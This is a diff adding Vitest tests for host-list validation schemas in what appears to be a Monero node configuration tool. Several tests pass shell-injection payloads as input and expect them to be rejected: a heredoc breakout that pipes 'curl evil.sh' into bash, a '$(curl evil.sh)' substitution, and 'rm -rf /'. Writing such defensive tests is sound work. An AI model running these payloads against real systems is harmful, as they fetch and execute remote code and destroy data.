@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest";
 import {
   hostPortSchema,
   hostListSchema,
+  hostListStringSchema,
   numericStringSchema,
   signedNumericStringSchema,
   moneroAddressSchema,
@@ -49,6 +50,32 @@ describe("hostListSchema", () => {
 
   it("rejects the whole list if any entry is invalid", () => {
     expect(hostListSchema.safeParse("peer1.example.org:18080,peer2.example.org:notaport").success).toBe(false);
+  });
+});
+
+describe("hostListStringSchema", () => {
+  it("keeps the string type (no transform) for valid host lists", () => {
+    const result = hostListStringSchema.safeParse("peer1.example.org:18080,peer2.example.org:18089");
+    expect(result.success).toBe(true);
+    if (result.success) {
+      expect(result.data).toBe("peer1.example.org:18080,peer2.example.org:18089");
+    }
+  });
+
+  it("accepts an empty string", () => {
+    expect(hostListStringSchema.safeParse("").success).toBe(true);
+  });
+
+  it("rejects entries that are not valid host[:port]", () => {
+    expect(hostListStringSchema.safeParse("peer1.example.org:18080,evil.com:notaport").success).toBe(false);
+  });
+
+  it("rejects heredoc-breakout / shell injection payloads", () => {
+    expect(
+      hostListStringSchema.safeParse("evil.com\nMONERO_COMPOSE_EOF\ncurl evil.sh | bash").success
+    ).toBe(false);
+    expect(hostListStringSchema.safeParse("$(curl evil.sh)").success).toBe(false);
+    expect(hostListStringSchema.safeParse("a.com; rm -rf /").success).toBe(false);
   });
 });
 
@@ -261,6 +288,27 @@ describe("full config server-side validation", () => {
     const config = baseConfig();
     config.monerod.dnsCheckpoints = "bogus" as FullConfig["monerod"]["dnsCheckpoints"];
     expect(fullConfigSchema.safeParse(config).success).toBe(false);
+  });
+
+  it("rejects script-injection payloads in the host-list peer fields", () => {
+    for (const field of ["addPeer", "addPriorityNode", "addExclusiveNode"] as const) {
+      const config = baseConfig();
+      config.monerod[field] =
+        "evil.com\nMONERO_COMPOSE_EOF\ncurl evil.sh | bash";
+      const result = fullConfigSchema.safeParse(config);
+      expect(result.success, field).toBe(false);
+      if (!result.success) {
+        expect(result.error.issues[0].path).toEqual(["monerod", field]);
+      }
+    }
+  });
+
+  it("accepts valid host lists in the host-list peer fields", () => {
+    const config = baseConfig();
+    config.monerod.addPeer = "peer1.example.org:18080, 1.2.3.4:18080";
+    config.monerod.addPriorityNode = `${"a".repeat(56)}.onion:18084`;
+    config.monerod.addExclusiveNode = "";
+    expect(fullConfigSchema.safeParse(config).success).toBe(true);
   });
 });
 
